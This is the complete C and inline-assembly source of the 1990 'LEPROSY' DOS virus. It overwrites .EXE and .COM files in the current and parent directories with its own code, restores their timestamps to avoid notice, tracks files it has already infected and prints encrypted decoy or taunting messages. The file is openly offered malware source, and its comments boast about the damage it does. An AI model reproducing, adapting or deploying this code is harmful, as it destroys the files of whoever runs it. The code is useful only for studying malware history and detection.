/*  This file is part of the source code to the LEPROSY Virus 1.00
    Copy-ya-right (c) 1990 by PCM2.  This program can cause destruction
    of files; you're warned, the author assumes no responsibility
    for damage this program causes, incidental or otherwise.  This
    program is not intended for general distribution -- irresponsible
    users should not be allowed access to this program, or its
    accompanying files.  (Unlike people like us, of course...)
*/


#pragma inline

#define   CRLF       "\x17\x14"          /*  CR/LF combo encrypted.  */
#define   NO_MATCH   0x12                /*  No match in wildcard search.  */


/*  The following strings are not garbled; they are all encrypted  */
/*  using the simple technique of adding the integer value 10 to   */
/*  each character.  They are automatically decrypted by           */
/*  'print_s()', the function which sends the strings to 'stdout'  */
/*  using DOS service 09H.  All are terminated with a dollar-sign  */
/*  "$" as per DOS service specifications.                         */

char fake_msg[] = CRLF "Z|yq|kw*~yy*lsq*~y*ps~*sx*wowy|\x83.";
char *virus_msg[3] =
  {
    CRLF "\x13XOa]*PVK]R++**cy\x7f|*}\x83}~ow*rk}*loox*sxpom~on*\x81s~r*~ro.",
    CRLF "\x13sxm\x7f|klvo*nomk\x83*yp*VOZ\\Y]c*;8::6*k*\x80s|\x7f}*sx\x80ox~on*l\x83.",
    CRLF "\x13ZMW<*sx*T\x7fxo*yp*;CC:8**Qyyn*v\x7fmu+\x17\x14."
  };



struct _dta                     /*  Disk Transfer Area format for find.  */
  {
    char findnext[21];
    char attribute;
    int timestamp;
    int datestamp;
    long filesize;
    char filename[13];
  } *dta = (struct _dta *) 0x80;   /*  Set it to default DTA.  */


const char filler[] = "XX";             /*  Pad file length to 666 bytes.  */
const char *codestart = (char *) 0x100;  /*  Memory where virus code begins.  */
const int virus_size = 666;      /*  The size in bytes of the virus code.  */
const int infection_rate = 4;     /*  How many files to infect per run.  */

char compare_buf[20];           /*  Load program here to test infection.  */
int handle;                     /*  The current file handle being used.  */
int datestamp, timestamp;       /*  Store original date and time here.  */
char diseased_count = 0;        /*  How many infected files found so far.  */
char success = 0;               /*  How many infected this run.  */


/*  The following are function prototypes, in keeping with ANSI    */
/*  Standard C, for the support functions of this program.         */

int find_first( char *fn );
int find_healthy( void );
int find_next( void );
int healthy( void );
void infect( void );
void close_handle( void );
void open_handle( char *fn );
void print_s( char *s );
void restore_timestamp( void );



/*----------------------------------*/
/*     M A I N    P R O G R A M     */
/*----------------------------------*/

int main( void )  {
  int x = 0;
  do {
    if ( find_healthy() )  {           /*  Is there an un-infected file?  */
      infect();                        /*  Well, then infect it!  */
      x++;                             /*  Add one to the counter.  */
      success++;                       /*  Carve a notch in our belt.  */
    }
    else  {                            /*  If there ain't a file here... */
      _DX = (int) "..";                /*  See if we can step back to  */
      _AH = 0x3b;                      /*  the parent directory, and try  */
      asm   int 21H;                   /*  there.  */
      x++;                             /*  Increment the counter anyway, to  */
    }                                  /*  avoid infinite loops.  */
  } while( x < infection_rate );       /*  Do this until we've had enough.  */
  if ( success )                       /*  If we got something this time,  */
    print_s( fake_msg );               /*  feed 'em the phony error line.  */
  else
    if ( diseased_count > 6 )          /*  If we found 6+ infected files  */
      for( x = 0; x < 3; x++ )         /*  along the way, laugh!!  */
        print_s( virus_msg[x] );
    else
      print_s( fake_msg );             /*  Otherwise, keep a low profile.  */
  return;
}


void infect( void )  {
  _DX = (int) dta->filename;  /*  DX register points to filename.  */
  _CX = 0x00;                 /*  No attribute flags are set.  */
  _AL = 0x01;                 /*  Use Set Attribute sub-function.  */
  _AH = 0x43;                 /*  Assure access to write file.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  open_handle( dta->filename );        /*  Re-open the healthy file.  */
  _BX = handle;                       /*  BX register holds handle.  */
  _CX = virus_size;                   /*  Number of bytes to write.  */
  _DX = (int) codestart;              /*  Write program code.  */
  _AH = 0x40;                         /*  Set up and call DOS.  */
  asm   int 21H;
  restore_timestamp();               /*  Keep original date & time.  */
  close_handle();                     /*  Close file.  */
  return;
}


int find_healthy( void )  {
  if ( find_first("*.EXE") != NO_MATCH )       /*  Find EXE?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  if ( find_first("*.COM") != NO_MATCH )       /*  Find COM?  */
    if ( healthy() )                         /*  If it's healthy, OK!  */
      return 1;
    else
      while ( find_next() != NO_MATCH )      /*  Try a few more otherwise. */
        if ( healthy() )
          return 1;                          /*  If you find one, great!  */
  return 0;                                  /*  Otherwise, say so.  */
}



int healthy( void )  {
  int i;
  datestamp = dta->datestamp;        /*  Save time & date for later.  */
  timestamp = dta->timestamp;
  open_handle( dta->filename );      /*  Open last file located.  */
  _BX = handle;                      /*  BX holds current file handle.  */
  _CX = 20;                          /*  We only want a few bytes.  */
  _DX = (int) compare_buf;          /*  DX points to the scratch buffer.  */
  _AH = 0x3f;                       /*  Read in file for comparison.  */
  asm   int 21H;
  restore_timestamp();              /*  Keep original date & time.  */
  close_handle();                   /*  Close the file.  */
  for ( i = 0; i < 20; i++ )        /*  Compare to virus code.  */
    if ( compare_buf[i] != *(codestart+i) )
      return 1;                     /*  If no match, return healthy.  */
  diseased_count++;                 /*  Chalk up one more fucked file.  */
  return 0;                         /*  Otherwise, return infected.  */
}


void restore_timestamp( void )  {
  _AL = 0x01;                         /*  Keep original date & time.  */
  _BX = handle;                       /*  Same file handle.  */
  _CX = timestamp;                    /*  Get time & date from DTA.  */
  _DX = datestamp;
  _AH = 0x57;                         /*  Do DOS service.  */
  asm   int 21H;
  return;
}


void print_s( char *s )  {
  char *p = s;
  while ( *p )  {              /*  Subtract 10 from every character.  */
    *p -= 10;
    p++;
  }
  _DX = (int) s;              /*  Set DX to point to adjusted string.   */
  _AH = 0x09;                 /*  Set DOS function number.  */
  asm   int 21H;              /*  Call DOS interrupt.  */
  return;
}


int find_first( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the file name.  */
  _CX = 0xff;                 /*  Search for all attributes.  */
  _AH = 0x4e;                 /*  'Find first' DOS service.  */
  asm   int 21H;              /*  Go, DOS, go.  */
  return _AX;                 /*  Return possible error code.  */
}


int find_next( void )  {
  _AH = 0x4f;                 /*  'Find next' function.  */
  asm   int 21H;              /*  Call DOS.  */
  return _AX;                 /*  Return any error code.  */
}


void open_handle( char *fn )  {
  _DX = (int) fn;             /*  Point DX to the filename.  */
  _AL = 0x02;                 /*  Always open for both read & write. */
  _AH = 0x3d;                 /*  "Open handle" service.  */
  asm   int 21H;              /*  Call DOS.  */
  handle = _AX;               /*  Assume handle returned OK.  */
  return;
}


void close_handle( void )  {
  _BX = handle;               /*  Load BX register w/current file handle.  */
  _AH = 0x3e;                 /*  Set up and call DOS service.  */
  asm   int 21H;
  return;
}
